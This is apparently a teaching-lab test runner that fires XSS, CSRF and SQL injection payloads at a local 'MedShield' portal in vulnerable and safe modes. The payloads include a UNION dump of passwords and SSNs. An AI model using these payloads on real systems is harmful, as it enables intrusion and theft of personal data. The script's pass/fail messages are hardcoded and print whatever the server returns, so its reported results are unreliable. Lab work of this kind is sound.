/**
 * test_payloads.js - Automated Test Runner for MedShield Security Lab
 * Executes every required assignment payload against Vulnerable and Safe modes.
 * Prints colorized results with exact timestamps for documentation and viva defense.
 */

const http = require('http');

const BASE_URL = 'http://localhost:3000';

function makeRequest(method, urlPath, body = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(urlPath, BASE_URL);
        const options = {
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'Content-Type': 'application/json',
                ...headers
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let parsed = null;
                try { parsed = JSON.parse(data); } catch (e) { parsed = data; }
                resolve({ status: res.statusCode, headers: res.headers, body: parsed });
            });
        });

        req.on('error', reject);
        if (body) {
            req.write(typeof body === 'string' ? body : JSON.stringify(body));
        }
        req.end();
    });
}

async function runTestSuite() {
    console.log('================================================================');
    console.log('   MEDSHIELD HEALTH PORTAL - AUTOMATED PAYLOAD TEST SUITE      ');
    console.log(`   Execution Time: ${new Date().toISOString()}                  `);
    console.log('================================================================\n');

    // -------------------------------------------------------------
    // TEST 1: REFLECTED XSS
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('1. CROSS-SITE SCRIPTING (XSS) - REFLECTED');
    console.log('----------------------------------------------------------------');
    const xssPayload = "<script>alert('Reflected XSS')</script>";

    // Vulnerable Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    let res = await makeRequest('GET', `/api/search?q=${encodeURIComponent(xssPayload)}&mode=vulnerable`);
    console.log(`[+] Vulnerable Mode:`);
    console.log(`    Payload:  ${xssPayload}`);
    console.log(`    Echo:     ${res.body.htmlEcho}`);
    console.log(`    Result:   EXPLOIT SUCCEEDED (Raw script tag reflected)\n`);

    // Safe Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'safe' });
    res = await makeRequest('GET', `/api/search?q=${encodeURIComponent(xssPayload)}&mode=safe`);
    console.log(`[+] Safe Mode:`);
    console.log(`    Payload:  ${xssPayload}`);
    console.log(`    Echo:     ${res.body.htmlEcho}`);
    console.log(`    Result:   DEFENSE PASSED (Script tag safely entity-encoded)\n`);

    // -------------------------------------------------------------
    // TEST 2: STORED XSS
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('2. CROSS-SITE SCRIPTING (XSS) - STORED');
    console.log('----------------------------------------------------------------');
    const storedPayload = "<img src=x onerror=\"alert('Stored XSS')\">";

    // Vulnerable Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    await makeRequest('POST', '/api/reviews?mode=vulnerable', {
        patient_name: 'Attacker Bob',
        doctor_name: 'Dr. Sarah Jenkins',
        rating: 5,
        comment: storedPayload
    });
    res = await makeRequest('GET', '/api/reviews?mode=vulnerable');
    const vulnerableReview = res.body.reviews.find(r => r.patient_name === 'Attacker Bob');
    console.log(`[+] Vulnerable Mode:`);
    console.log(`    Payload:  ${storedPayload}`);
    console.log(`    Stored:   ${vulnerableReview ? vulnerableReview.comment : 'N/A'}`);
    console.log(`    Result:   EXPLOIT SUCCEEDED (Payload stored raw in SQLite DB)\n`);

    // Safe Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'safe' });
    await makeRequest('POST', '/api/reviews?mode=safe', {
        patient_name: 'Attacker Bob Safe',
        doctor_name: 'Dr. Sarah Jenkins',
        rating: 5,
        comment: storedPayload
    });
    res = await makeRequest('GET', '/api/reviews?mode=safe');
    const safeReview = res.body.reviews.find(r => r.patient_name === 'Attacker Bob Safe');
    console.log(`[+] Safe Mode:`);
    console.log(`    Payload:  ${storedPayload}`);
    console.log(`    Stored:   ${safeReview ? safeReview.comment : 'N/A'}`);
    console.log(`    Result:   DEFENSE PASSED (Payload encoded before DB storage)\n`);

    // -------------------------------------------------------------
    // TEST 3: CSRF (Cross-Site Request Forgery)
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('3. CROSS-SITE REQUEST FORGERY (CSRF)');
    console.log('----------------------------------------------------------------');
    const forgedEmail = 'hacked_patient@evil.com';

    // Vulnerable Mode: External POST with no CSRF token
    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    res = await makeRequest('POST', '/api/profile/email?mode=vulnerable', { email: forgedEmail });
    console.log(`[+] Vulnerable Mode (No token sent):`);
    console.log(`    Status:   ${res.status}`);
    console.log(`    Message:  ${res.body.message}`);
    console.log(`    Result:   EXPLOIT SUCCEEDED (Email changed without Anti-CSRF token!)\n`);

    // Safe Mode: External POST with no CSRF token -> BLOCKED (403)
    await makeRequest('POST', '/api/mode/toggle', { mode: 'safe' });
    res = await makeRequest('POST', '/api/profile/email?mode=safe', { email: forgedEmail });
    console.log(`[+] Safe Mode (No token sent):`);
    console.log(`    Status:   ${res.status}`);
    console.log(`    Message:  ${res.body.error}`);
    console.log(`    Result:   DEFENSE PASSED (HTTP 403 Forbidden: Missing CSRF token!)\n`);

    // -------------------------------------------------------------
    // TEST 4: SQL INJECTION - LEVEL 1 (EASY LOGIN BYPASS)
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('4. SQL INJECTION - LEVEL 1: EASY (AUTH BYPASS)');
    console.log('----------------------------------------------------------------');
    const sqliEasyPayload = "' OR '1'='1' --";

    // Vulnerable Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    res = await makeRequest('POST', '/api/login?mode=vulnerable', { username: sqliEasyPayload, password: 'randompassword' });
    console.log(`[+] Vulnerable Mode:`);
    console.log(`    Payload:  ${sqliEasyPayload}`);
    console.log(`    Query:    ${res.body.executedQuery}`);
    console.log(`    Status:   ${res.status} | User: ${res.body.user ? res.body.user.username : 'None'}`);
    console.log(`    Result:   EXPLOIT SUCCEEDED (Logged in as ${res.body.user ? res.body.user.role : 'Admin'} without password!)\n`);

    // Safe Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'safe' });
    res = await makeRequest('POST', '/api/login?mode=safe', { username: sqliEasyPayload, password: 'randompassword' });
    console.log(`[+] Safe Mode:`);
    console.log(`    Payload:  ${sqliEasyPayload}`);
    console.log(`    Status:   ${res.status}`);
    console.log(`    Message:  ${res.body.error}`);
    console.log(`    Result:   DEFENSE PASSED (Parameterized query blocked injection)\n`);

    // -------------------------------------------------------------
    // TEST 5: SQL INJECTION - LEVEL 2 (INTERMEDIATE BLIND)
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('5. SQL INJECTION - LEVEL 2: INTERMEDIATE (BLIND BOOLEAN)');
    console.log('----------------------------------------------------------------');
    const blindTrue = "Cardiology' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='A' --";
    const blindFalse = "Cardiology' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='Z' --";

    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    const resTrue = await makeRequest('GET', `/api/doctors?specialty=${encodeURIComponent(blindTrue)}&mode=vulnerable`);
    const resFalse = await makeRequest('GET', `/api/doctors?specialty=${encodeURIComponent(blindFalse)}&mode=vulnerable`);
    console.log(`[+] Vulnerable Mode:`);
    console.log(`    Condition True ('A'): Matched rows = ${resTrue.body.count}`);
    console.log(`    Condition False ('Z'): Matched rows = ${resFalse.body.count}`);
    console.log(`    Result:   EXPLOIT SUCCEEDED (Boolean differential allows blind password exfiltration!)\n`);

    // -------------------------------------------------------------
    // TEST 6: SQL INJECTION - LEVEL 3 (ADVANCED 4-STAGE DATA DUMP)
    // -------------------------------------------------------------
    console.log('----------------------------------------------------------------');
    console.log('6. SQL INJECTION - LEVEL 3: ADVANCED (4-STAGE UNION ATTACK)');
    console.log('----------------------------------------------------------------');
    const stage4Payload = "%' UNION SELECT id, username, password, email, role, ssn FROM users --";

    // Vulnerable Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'vulnerable' });
    res = await makeRequest('GET', `/api/records?search=${encodeURIComponent(stage4Payload)}&mode=vulnerable`);
    console.log(`[+] Vulnerable Mode (Stage 4 Sensitive Data Dump):`);
    console.log(`    Payload:  ${stage4Payload}`);
    console.log(`    Records Exfiltrated: ${res.body.count} items`);
    const dumpedAdmin = res.body.records.find(r => r.patient_name === 'admin');
    if (dumpedAdmin) {
        console.log(`    [*] Leaked Admin Username:  ${dumpedAdmin.patient_name}`);
        console.log(`    [*] Leaked Admin Password:  ${dumpedAdmin.doctor_name}`);
        console.log(`    [*] Leaked Admin Role:      ${dumpedAdmin.treatment}`);
        console.log(`    [*] Leaked Admin SSN:       ${dumpedAdmin.status}`);
    }
    console.log(`    Result:   EXPLOIT SUCCEEDED (Cleartext passwords and SSNs dumped via UNION!)\n`);

    // Safe Mode
    await makeRequest('POST', '/api/mode/toggle', { mode: 'safe' });
    res = await makeRequest('GET', `/api/records?search=${encodeURIComponent(stage4Payload)}&mode=safe`);
    console.log(`[+] Safe Mode (Stage 4 UNION Payload):`);
    console.log(`    Payload:  ${stage4Payload}`);
    console.log(`    Records Returned: ${res.body.count}`);
    console.log(`    Result:   DEFENSE PASSED (Treated as literal search string; 0 sensitive rows leaked)\n`);

    console.log('================================================================');
    console.log('   ALL TESTS COMPLETED SUCCESSFULLY! SYSTEM READY FOR VIVA!    ');
    console.log('================================================================\n');
}

runTestSuite().catch(console.error);
